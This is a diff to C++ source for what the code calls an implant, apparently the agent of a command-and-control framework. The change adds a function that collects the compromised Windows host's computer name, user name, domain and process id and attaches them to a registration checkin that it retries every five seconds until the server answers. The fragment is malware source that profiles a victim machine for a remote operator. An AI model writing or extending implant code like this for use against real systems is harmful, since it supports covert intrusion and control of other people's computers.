@@ -15,6 +15,38 @@ VOID ImplantLoop() {
     }
 }
 
+json ImplantMetaData() {
+    json  info;
+    char  hostName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD hostLen = sizeof( hostName );
+    char  userName[256 + 1];
+    DWORD userLen = sizeof( userName );
+    char  domainName[256];
+    DWORD domainLen = sizeof( domainName );
+
+    info["host"] = "";
+    if (GetComputerNameA( hostName, &hostLen )) {
+        info["host"] = hostName;
+    }
+
+    info["user"] = "";
+    if (GetUserNameA( userName, &userLen )) {
+        info["user"] = userName;
+    }
+
+    info["domain"] = "";
+    if (GetComputerNameExA( ComputerNameDnsDomain, domainName, &domainLen )) {
+        if (domainLen > 0) {
+            info["domain"] = domainName;
+        }
+    }
+
+    info["pid"] = std::to_string( GetCurrentProcessId() );
+    info["os"]  = "win";
+
+    return info;
+}
+
 /*
  * @brief Send checkin request
  */
@@ -23,8 +55,10 @@ VOID ImplantRegister() {
     json   response;
     string magic;
 
-    while (1) {
+    checkin["name"]     = "register";
+    checkin["artifact"] = ImplantMetaData().dump().c_str();
 
+    while (1) {
         if (!ImplantSendCheckin( checkin, response )) {
             Sleep( 5000 );
             continue;
